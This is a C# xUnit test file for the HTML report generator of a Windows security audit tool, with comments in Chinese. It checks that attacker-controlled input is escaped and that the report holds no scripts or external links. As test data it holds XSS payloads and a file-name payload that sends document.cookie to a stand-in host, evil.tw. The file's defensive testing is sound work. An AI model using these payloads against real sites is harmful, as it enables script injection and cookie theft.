using System.Net;
using LcAudit.Core.Model;
using LcAudit.Reporting;
using Xunit;

namespace LcAudit.Core.Tests;

public sealed class HtmlReporterTests
{
    private static readonly DateTimeOffset ScanTime = new(2026, 8, 10, 14, 30, 0, TimeSpan.FromHours(8));

    private static AuditReport Report(params Finding[] findings) => new()
    {
        ToolVersion = "9.9.9-test",
        ScannedAt = ScanTime,
        IsElevated = true,
        Host = new HostInfo { ComputerName = "PC-01", OsVersion = "Windows 11", TimeZone = "Taipei Standard Time" },
        Summary = new AuditSummary
        {
            Score = findings.Sum(f => f.Score),
            RawScore = findings.Sum(f => f.Score),
            Level = RiskLevel.Low,
            CriticalHits = 0,
            Inferences = [],
            SkippedModules = new HashSet<string>(),
        },
        Findings = findings,
    };

    private static Finding Finding(
        string id = "M1-01",
        CheckStatus status = CheckStatus.Pass,
        string title = "測試項目",
        string? description = null,
        Evidence[]? evidence = null) => new()
        {
            Id = id,
            Module = id.Split('-')[0],
            Title = title,
            Severity = Severity.High,
            Status = status,
            Source = "測試",
            Description = description,
            Evidence = evidence ?? [],
        };

    // ---- 這是本檔最重要的測試 ----

    /// <summary>
    /// 報告內容大量來自攻擊者可控的資料：Security 4625 的帳號名稱是嘗試登入者自己填的、
    /// 檔名可以任意命名。若不跳脫，開啟報告就會執行攻擊者的指令碼 ——
    /// 稽核工具的產出變成攻擊載體。
    /// </summary>
    [Theory]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("\"><script>alert(1)</script>")]
    [InlineData("</details><script>alert(1)</script>")]
    [InlineData("<svg/onload=alert(1)>")]
    public void 攻擊者可控的內容必須被跳脫(string payload)
    {
        var html = new HtmlReporter().Render(Report(Finding(
            title: payload,
            description: payload,
            evidence: [new Evidence(payload, payload, ScanTime)])));

        // 真正的安全性質：原始字串不得原樣出現（那才代表形成了標籤），
        // 且必須以編碼形式出現（代表確實有被輸出、只是變成惰性文字）。
        // 注意不能斷言「不含 onerror=」—— 跳脫後它是純文字，出現是正常且無害的。
        Assert.DoesNotContain(payload, html, StringComparison.Ordinal);
        Assert.Contains(WebUtility.HtmlEncode(payload), html, StringComparison.Ordinal);
    }

    [Fact]
    public void 惡意檔名不會破壞證據區塊()
    {
        var maliciousPath = @"C:\Temp\<script>fetch('http://evil.tw?c='+document.cookie)</script>.exe";

        var html = new HtmlReporter().Render(Report(Finding(
            status: CheckStatus.Fail,
            evidence: [new Evidence("檔案路徑", maliciousPath)])));

        Assert.DoesNotContain(maliciousPath, html, StringComparison.Ordinal);
        Assert.DoesNotContain("<script", html, StringComparison.OrdinalIgnoreCase);
        Assert.Contains(WebUtility.HtmlEncode(maliciousPath), html, StringComparison.Ordinal);
    }

    [Fact]
    public void 報告不含任何JavaScript()
    {
        // 折疊用原生 <details>，不寫腳本 —— 沒有腳本就沒有腳本漏洞
        var html = new HtmlReporter().Render(Report(Finding()));

        Assert.DoesNotContain("<script", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("javascript:", html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void 報告不引用任何外部資源()
    {
        // 功能規格 §8.3：單一自包含檔案；NFR-06：不得發出任何網路請求
        var html = new HtmlReporter().Render(Report(Finding()));

        Assert.DoesNotContain("http://", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("https://", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<link", html, StringComparison.OrdinalIgnoreCase);
    }

    // ---- 結構 ----

    [Fact]
    public void 包含功能規格8_3要求的四個區塊()
    {
        var html = new HtmlReporter().Render(Report(Finding(
            status: CheckStatus.Fail,
            evidence: [new Evidence("時間", "值", ScanTime)])));

        Assert.Contains("風險等級", html, StringComparison.Ordinal);      // 頂部卡片
        Assert.Contains("時間軸", html, StringComparison.Ordinal);        // 中段
        Assert.Contains("<details", html, StringComparison.Ordinal);      // 下段可折疊明細
        Assert.Contains("取證保存提醒", html, StringComparison.Ordinal);  // 底部
    }

    [Fact]
    public void 有問題的項目預設展開通過的收合()
    {
        var html = new HtmlReporter().Render(Report(
            Finding("M1-01", CheckStatus.Fail),
            Finding("M1-02", CheckStatus.Pass)));

        Assert.Contains("<details open>", html, StringComparison.Ordinal);
        Assert.Contains("<details>", html, StringComparison.Ordinal);
    }

    [Fact]
    public void 時間軸依時間新到舊排序()
    {
        var html = new HtmlReporter().Render(Report(Finding(evidence:
        [
            new Evidence("舊", "早的事件", ScanTime.AddHours(-5)),
            new Evidence("新", "晚的事件", ScanTime),
        ])));

        Assert.True(
            html.IndexOf("晚的事件", StringComparison.Ordinal) < html.IndexOf("早的事件", StringComparison.Ordinal),
            "時間軸未依新到舊排序");
    }

    [Fact]
    public void 沒有時間戳證據時時間軸顯示空狀態()
    {
        var html = new HtmlReporter().Render(Report(Finding()));

        Assert.Contains("沒有帶時間點的跡證", html, StringComparison.Ordinal);
    }

    [Fact]
    public void 報告帶有工具版本供事後追溯()
    {
        // 報告可能在事發數週後才被翻出來比對，屆時工具早已更新過 ——
        // 沒有版本號就無法判斷這份報告當時漏掉了哪些檢查項
        var html = new HtmlReporter().Render(Report(Finding()));

        Assert.Contains("9.9.9-test", html, StringComparison.Ordinal);
    }

    [Fact]
    public void 版本號也會被跳脫()
    {
        // 版本字串來自組件中繼資料，理論上安全，但沒有理由在這裡破例
        var html = new HtmlReporter().Render(Report(Finding()) with { ToolVersion = "<script>x</script>" });

        Assert.DoesNotContain("<script>x</script>", html, StringComparison.Ordinal);
    }

    [Fact]
    public void 產出為合法的HTML文件()
    {
        var html = new HtmlReporter().Render(Report(Finding()));

        Assert.StartsWith("<!DOCTYPE html>", html, StringComparison.Ordinal);
        Assert.Contains("<meta charset=\"utf-8\">", html, StringComparison.Ordinal);
        Assert.Contains("lang=\"zh-Hant\"", html, StringComparison.Ordinal);
        Assert.EndsWith("</html>", html.TrimEnd(), StringComparison.Ordinal);
    }
}
